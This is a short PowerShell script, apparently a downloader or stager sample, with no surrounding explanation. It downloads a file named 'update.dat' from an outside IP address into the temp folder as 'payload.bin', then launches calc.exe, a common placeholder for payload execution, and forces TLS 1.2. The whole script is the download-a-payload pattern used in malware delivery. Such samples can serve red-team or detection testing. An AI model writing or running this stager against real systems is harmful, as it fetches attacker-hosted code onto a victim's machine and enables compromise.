[CmdletBinding()]
param(
    [string]$DownloadUrl = "https://203.0.113.225/update.dat",
    [string]$WorkingPath = "$env:TEMP\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $WorkingPath)
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
